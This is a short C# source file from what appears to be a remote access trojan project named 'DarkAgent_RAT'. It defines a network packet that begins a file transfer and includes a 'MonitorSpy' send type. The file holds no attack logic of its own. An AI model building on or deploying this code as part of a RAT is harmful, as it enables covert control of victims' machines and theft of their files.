using System;
using System.Collections.Generic;
using System.Text;
using DarkAgent_RAT.src.Objects;

namespace DarkAgent_RAT.src.Network.FileServer.Packets.Send
{
    public class S_FileTransferSendBegin : SendBasePacket
    {
        private FileTransfer info;
        private SendType type;
        public S_FileTransferSendBegin(FileClients client, FileTransfer info, SendType type)
            : base(client)
        {
            this.info = info;
            this.type = type;
        }

        public enum SendType
        {
            FileManager = 0,
            MonitorSpy = -1
        }

        protected internal override void Write()
        {
            WriteByte(0x00);
            WriteShort(info.Id);
            WriteString(info.FileName);
            WriteString(info.Destination);
            WriteLong(info.FileSize);
            WriteByte((byte)type);
        }
    }
}
